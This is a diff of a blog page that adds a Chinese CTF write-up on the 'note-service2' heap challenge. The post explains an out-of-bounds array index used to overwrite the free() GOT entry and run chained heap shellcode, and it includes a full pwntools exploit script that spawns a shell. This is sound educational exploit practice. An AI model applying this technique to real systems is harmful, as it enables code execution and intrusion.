@@ -9,6 +9,7 @@
     <meta http-equiv="Cache-Control" content="no-siteapp"/>
     <link rel="stylesheet" href="/styles/main.css">
     <link rel="stylesheet" href="//cdnjs.loli.net/ajax/libs/mdui/0.4.3/css/mdui.min.css">
+    <link rel="stylesheet" href="/media/css/post.css">
     <link rel="stylesheet" href="/media/live2d/css/live2d.css" />
     
 </head>
@@ -44,43 +45,107 @@
     </ul>
 </div>
 
-<div class="mdui-container">
-    <div class="mdui-row">
-        <div class="mdui-col-md-10 mdui-col-offset-md-1 ">
-            
-            
-                <div class="mdui-typo-display-1 mdui-m-b-2 mdui-m-l-1">
-                    <div class="mdui-row">
-                        <div class="mdui-col-xs-12">2020</div>
-                    </div>
-                    <div class="mdui-row">
-                        
-                        
-                            <div class="mdui-col-xs-6 mdui-p-a-1">
-                                <div class="mdui-card">
-                                    <div class="mdui-card-media">
-                                        <img width=536px height=300px src=" https://https://czh11.github.io//post-images/ctfpwn-yi-dao-shu-zu-yue-jie-de-dui-ti.jpg"/>
-                                        <div class="mdui-card-primary">
-                                            <div class="mdui-card-primary-title">ctfpwn 一道数组越界的堆题</div>
-                                            <div class="mdui-card-primary-subtitle">2020-11-19</div>
-                                        </div>
-                                    </div>
-                                    <div class="mdui-card-actions" style="float:right;">
-                                        <a href="https://https://czh11.github.io/post/ctfpwn-yi-dao-shu-zu-yue-jie-de-dui-ti/" class="mdui-btn mdui-color-theme-accent mdui-ripple">点击查看</a>
-                                    </div>
-                                </div>
-                            </div>
-                        
-                        
-                    </div>
+<div id="content" class="site-content">
+    <div id="primary" class="content-area">
+        <main id="main" class="site-main" role="main">
+            <article id="post-1270" class="post-1270 post type-post status-publish format-standard hentry category-90 category-129 tag-149">
+                <header class="entry-header">
+                    <h1 class="entry-title">ctfpwn 一道数组越界的堆题</h1>
+                    <p class="entry-census">发布于 2020-11-19</p>
+                    <hr>
+                </header>
+                <div class="neko">
+                    <p><img src="https://https://czh11.github.io//post-images/1605793554457.png" alt="" loading="lazy"><br>
+没有限制v1的范围，导致数组的下标可以为任意值，造成数组越界。<br>
+<img src="https://https://czh11.github.io//post-images/1605793729793.jpg" alt="" loading="lazy"><br>
+没有开启NX，堆栈可执行，所以可以把shellcode写在堆上，堆申请的大小最大为8，所以要把shellcode写在多个堆块上，</p>
+<figure data-type="image" tabindex="1"><img src="https://https://czh11.github.io//post-images/1605793839389.jpg" alt="" loading="lazy"></figure>
+<p>同时写进去的最后一个字节会被置0，因此正真能写的只有7个字节。</p>
+<p>综上，我们可以申请任意地址的8个字节改为我们申请的堆块的指针，这里修改got表的内容让它跳转到我们shellcode的地址。</p>
+<p>Jmp short xxxx指令占用2字节，这条指令使用的是相对当前指令的下一条指令位置寻址的 。</p>
+<figure data-type="image" tabindex="2"><img src="https://https://czh11.github.io//post-images/1605793857686.jpg" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://https://czh11.github.io//post-images/1605793900510.jpg" alt="" loading="lazy"></figure>
+<pre><code>#!/usr/bin/env python2
+#-*- coding:utf-8 -*
+from pwn import *
+p=process(&quot;./note-service2&quot;)
+#p=remote(&quot;220.249.52.133&quot;,42490)
+elf=ELF(&quot;./note-service2&quot;)
+print(hex(elf.got['free']))
+context.log_level='debug'
+context.arch='amd64'
+def add(index,content):
+    p.recvuntil('your choice&gt;&gt;')
+    p.sendline('1')
+    p.recvuntil('index')
+    p.sendline(str(index))
+    p.recvuntil('size')
+    p.sendline(str(8))    
+    p.recvuntil('content')
+    p.send(content)
+
+def delete(index):
+	p.recvuntil('your choice&gt;&gt;')
+	p.sendline('4')
+	p.recvuntil('index:')
+	p.sendline(str(index))
+
+&quot;&quot;&quot;
+;64位系统调用
+mov rdi,xxxx;&quot;/bin/sh&quot;的地址
+mov rax,0x3b;execve系统调用号
+mov rsi,0
+mov rdx,0
+sycall
+&quot;&quot;&quot;
+gdb.attach(p)
+add(0,'/bin/sh')# 向第一个chunk中写入/bin/sh
+add((elf.got['free']-0x2020A0)/8,asm('xor rsi,rsi')+'\x90\x90\xeb\x19')
+#把got表中free函数的指针覆盖为第二个chunk的指针
+#然后在第二个chunk中写入
+#xor rsi,rsi
+#nop
+#nop
+#jmp 0x19
+add(1,asm('push 0x3b\n pop rax')+'\x90\x90\xeb\x19')
+#mov rax,0x3b的机器码站7个字节,而push 0x3b;pop rax只占3个字节
+#push 0x3b
+#pop rax
+#nop
+#nop
+#jmp 0x19
+add(2,asm('xor rdx,rdx')+'\x90\x90\xeb\x19')
+#
+add(3,asm('syscall')+'\x90'*5)
+
+delete(0)
+#因为got表的free函数的地址被修改为我们第二个chunk的地址了,
+#所以我们调用free的时候就跳转到了我们第二个chunk的数据段,
+#因为这是一个64位程序的函数调用，所以程序会把我们第一个chunk的数据区的指针放入RDI;
+#在64位的程序中,当参数少于7个时,参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。
+
+p.interactive()
+</code></pre>
+
                 </div>
-            
+            </article>
+        </main>
+    </div>
+    <div class="doc-footer-nav mdui-color-theme">
+        <div class="mdui-container">
+            <div class="mdui-row">
+                
+                <div class="mdui-col-xs-2 mdui-col-sm-6 doc-footer-nav-left"></div>
+                
+                
+                <div class="mdui-col-xs-2 mdui-col-sm-6 doc-footer-nav-left"></div>
+                
+            </div>
         </div>
     </div>
-    <div class="mdui-row">
-        
-
-    </div>
+    <br>
+    
+    <div class="comment"></div>
 </div>
 <footer class="mdui-container footer ">
     <div class="head_card-offset"></div>
@@ -132,4 +197,23 @@
 
 </body>
 <script src="//cdnjs.loli.net/ajax/libs/mdui/0.4.3/js/mdui.min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    $('.comment').bind('DOMNodeInserted',()=>{
+        $('.comment').unbind()
+
+        $('.vbtn').addClass(' mdui-btn mdui-color-theme-accent mdui-ripple')
+    })
+
+    let valine = new Valine({
+        el: '.comment',
+        
+        
+        
+        path: window.location.pathname,
+        pageSize: 30,
+        avatar:'mm',
+        notify:true
+    })
+</script>
 </html>
